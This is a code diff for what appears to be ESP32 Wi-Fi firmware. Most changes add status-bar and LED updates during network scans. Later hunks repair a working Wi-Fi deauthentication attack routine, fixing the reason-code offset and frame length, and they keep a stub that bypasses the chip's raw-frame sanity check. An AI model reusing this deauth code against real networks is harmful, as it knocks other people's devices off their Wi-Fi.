@@ -10,6 +10,7 @@
 #include "freertos/task.h"
 #include "icon.h"
 #include "shared.h"
+#include "StatusLedService.h"
 #include "utils.h"
 
 /** Active-scan dwell per channel for STA scans (Arduino default 300 ms; shared.h WIFI_SCAN_ACTIVE_MS). */
@@ -1977,6 +1978,7 @@ static void bgWifiScanTask(void* ) {
     if (settings().autoWifiScan && idleOk && !feature_active && !in_sub_menu) {
 
       if (!bgScanRunning) {
+        setStatusBarWifiState(StatusBarRadioState::Scanning);
         WiFi.mode(WIFI_STA);
         WiFi.disconnect();
         WiFi.scanDelete();
@@ -1988,9 +1990,11 @@ static void bgWifiScanTask(void* ) {
 
           bgHasResults = true;
           bgLastScanMs = now;
+          setStatusBarWifiState((ret > 0) ? StatusBarRadioState::Active : StatusBarRadioState::Off);
           vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
         } else if (!bgScanRunning) {
 
+          setStatusBarWifiState(StatusBarRadioState::Error);
           vTaskDelay(2000 / portTICK_PERIOD_MS);
         } else {
           vTaskDelay(250 / portTICK_PERIOD_MS);
@@ -2001,10 +2005,12 @@ static void bgWifiScanTask(void* ) {
           bgHasResults = true;
           bgLastScanMs = now;
           bgScanRunning = false;
+          setStatusBarWifiState((n > 0) ? StatusBarRadioState::Active : StatusBarRadioState::Off);
           vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
         } else if (n == WIFI_SCAN_FAILED) {
           bgScanRunning = false;
           WiFi.scanDelete();
+          setStatusBarWifiState(StatusBarRadioState::Error);
           vTaskDelay(2000 / portTICK_PERIOD_MS);
         } else {
 
@@ -2016,12 +2022,16 @@ static void bgWifiScanTask(void* ) {
       if (bgScanRunning) {
         stopBgWifiScanIfRunning();
       }
+      if (!settings().autoWifiScan) {
+        setStatusBarWifiState(StatusBarRadioState::Off);
+      }
       vTaskDelay(1000 / portTICK_PERIOD_MS);
     }
   }
 }
 
 void startBackgroundScanner() {
+  if (!settings().autoWifiScan) return;
   if (bgScanTaskHandle != nullptr) return;
   xTaskCreatePinnedToCore(
     bgWifiScanTask,
@@ -2036,7 +2046,6 @@ void startBackgroundScanner() {
 
 int getLastCount() {
 
-  if (!settings().autoWifiScan) return 0;
   int n = WiFi.scanComplete();
   return (n < 0) ? 0 : n;
 }
@@ -2057,11 +2066,15 @@ int staWifiScanSync() {
   delay(50);
   const uint32_t dwell = wifiStaScanMsPerChannel();
   fgWifiScanInProgress = true;
+  setStatusBarWifiState(StatusBarRadioState::Scanning);
   const int n = WiFi.scanNetworks(false, true, false, dwell);
   fgWifiScanInProgress = false;
   if (n >= 0) {
     bgHasResults = true;
     bgLastScanMs = millis();
+    setStatusBarWifiState((n > 0) ? StatusBarRadioState::Active : StatusBarRadioState::Off);
+  } else {
+    setStatusBarWifiState(StatusBarRadioState::Error);
   }
   return n;
 }
@@ -2289,6 +2302,10 @@ void startWiFiScan() {
   currentIndex = 0;
   listStartIndex = 0;
 
+  setStatusBarWifiState(StatusBarRadioState::Scanning);
+  drawStatusBar(currentBatteryVoltage, true);
+  StatusLedService::startActivity(StatusLedService::Mode::WifiScan);
+
   displayScanning();
 
   pauseBackgroundRadioTasks();
@@ -2308,6 +2325,8 @@ void startWiFiScan() {
         (void)esp_wifi_scan_stop();
         fgWifiScanInProgress = false;
         isScanning = false;
+        setStatusBarWifiState(StatusBarRadioState::Off);
+        StatusLedService::stopActivity(StatusLedService::Mode::Idle);
         feature_exit_requested = true;
         return;
       }
@@ -2321,7 +2340,12 @@ void startWiFiScan() {
   if (numNetworks >= 0) {
     bgHasResults = true;
     bgLastScanMs = millis();
+    setStatusBarWifiState((numNetworks > 0) ? StatusBarRadioState::Active : StatusBarRadioState::Off);
+  } else {
+    setStatusBarWifiState(StatusBarRadioState::Error);
   }
+  StatusLedService::stopActivity(StatusLedService::Mode::Idle);
+  drawStatusBar(currentBatteryVoltage, true);
 
   displayWiFiList(true);
 }
@@ -3048,19 +3072,21 @@ static void cpSendDeauthFrame() {
 
   esp_wifi_set_channel(cp_target_channel, WIFI_SECOND_CHAN_NONE);
 
-  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
+  memcpy(cp_deauth_frame, cp_deauth_frame_default, sizeof(cp_deauth_frame_default));
   memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
   memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
-  cp_deauth_frame[26] = 7;
-  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);
+  cp_deauth_frame[24] = 7;
+  cp_deauth_frame[25] = 0;
+  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, sizeof(cp_deauth_frame));
 
-  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
+  memcpy(cp_deauth_frame, cp_deauth_frame_default, sizeof(cp_deauth_frame_default));
   memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
   memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
 
   memset(&cp_deauth_frame[4], 0xFF, 6);
-  cp_deauth_frame[26] = 7;
-  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);
+  cp_deauth_frame[24] = 7;
+  cp_deauth_frame[25] = 0;
+  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, sizeof(cp_deauth_frame));
 
   cp_deauth_packet_count += 2;
 }
@@ -4252,7 +4278,7 @@ static void deautherOpenTarget(int index) {
   drawAttackScreen();
 }
 
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+extern "C" __attribute__((weak)) int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     return 0;
 }
 
@@ -4273,7 +4299,8 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t c
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
-    deauth_frame[26] = 7;
+    deauth_frame[24] = 7;
+    deauth_frame[25] = 0;
 
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
 }
